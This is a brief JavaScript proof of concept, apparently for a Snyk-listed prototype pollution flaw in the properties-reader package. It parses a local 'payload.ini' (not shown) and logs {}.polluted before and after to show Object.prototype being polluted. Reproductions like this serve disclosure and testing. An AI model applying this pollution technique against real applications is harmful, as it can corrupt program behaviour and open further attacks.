//https://snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968
  const propertiesReader = require("properties-reader");
  const path = require("path");
  console.log({}.polluted)
  propertiesReader(path.resolve(__dirname, "./payload.ini"));
  console.log({}.polluted)

